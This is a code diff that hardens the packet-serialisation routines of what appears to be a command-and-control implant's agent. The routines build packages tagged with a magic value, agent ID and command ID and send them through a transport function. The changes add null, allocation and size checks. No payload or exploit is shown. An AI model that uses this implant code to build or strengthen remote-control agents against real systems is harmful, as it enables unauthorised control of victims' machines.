@@ -11,25 +11,60 @@ VOID Int32ToBuffer(PUCHAR buf, UINT32 val){
 }
 
 VOID PackageAddInt32(PPACKAGE Package, UINT32 data){
-    Package->Buffer = LocalReAlloc(Package->Buffer, Package->Length + 4, LMEM_MOVEABLE);
+    if (!Package || !Package->Valid)
+        return;
+
+    PVOID buf = LocalReAlloc(Package->Buffer, Package->Length + 4, LMEM_MOVEABLE);
+    if (!buf){
+        Package->Valid = FALSE;
+        return;
+    }
+
+    Package->Buffer = buf;
     Int32ToBuffer(Package->Buffer + Package->Length, data);
     Package->Length += 4;
 }
 
 VOID PackageAddBytes(PPACKAGE Package, PUCHAR Data, SIZE_T Size){
-    PackageAddInt32(Package, Size);
-    Package->Buffer = LocalReAlloc(Package->Buffer, Package->Length + Size, LMEM_MOVEABLE | LMEM_ZEROINIT);
+    if (!Package || !Package->Valid)
+        return;
+
+    if (Size > 0xFFFFFFFF || (!Data && Size)){
+        Package->Valid = FALSE;
+        return;
+    }
+
+    PackageAddInt32(Package, (UINT32)Size);
+    if (!Package->Valid)
+        return;
+
+    PVOID buf = LocalReAlloc(Package->Buffer, Package->Length + Size, LMEM_MOVEABLE | LMEM_ZEROINIT);
+    if (!buf){
+        Package->Valid = FALSE;
+        return;
+    }
+
+    Package->Buffer = buf;
     memcpy(Package->Buffer + Package->Length, Data, Size);
-    Package->Length += Size;
+    Package->Length += (UINT32)Size;
 }
 
 PPACKAGE PackageCreate(UINT32 CommandID){
-    PPACKAGE pkg     = LocalAlloc(LPTR, sizeof(PACKAGE));
-    pkg->Buffer      = LocalAlloc(LPTR, sizeof(BYTE));
-    pkg->Length      = 0;
-    pkg->CommandID   = CommandID;
+    PPACKAGE pkg = LocalAlloc(LPTR, sizeof(PACKAGE));
+    if (!pkg)
+        return NULL;
 
-    PackageAddInt32(pkg, 0);              // size placeholder
+    pkg->Buffer = LocalAlloc(LPTR, sizeof(BYTE));
+    if (!pkg->Buffer){
+        LocalFree(pkg);
+        return NULL;
+    }
+
+    pkg->Length    = 0;
+    pkg->CommandID = CommandID;
+    pkg->Valid     = TRUE;
+
+    PackageAddInt32(pkg, 0);
     PackageAddInt32(pkg, MAYO_MAGIC);
     PackageAddInt32(pkg, g_AgentID);
     PackageAddInt32(pkg, CommandID);
@@ -50,7 +85,12 @@ VOID PackageDestroy(PPACKAGE Package){
 BOOL PackageTransmit(PPACKAGE Package, PVOID* Response, PSIZE_T Size){
     if (!Package) return FALSE;
 
-    Int32ToBuffer(Package->Buffer, Package->Length - 4); // write actual size into first 4 bytes
+    if (!Package->Valid || Package->Length < 4){
+        PackageDestroy(Package);
+        return FALSE;
+    }
+
+    Int32ToBuffer(Package->Buffer, Package->Length - 4);
 
     BOOL ok = TransportSend(Package->Buffer, Package->Length, Response, Size);
     PackageDestroy(Package);
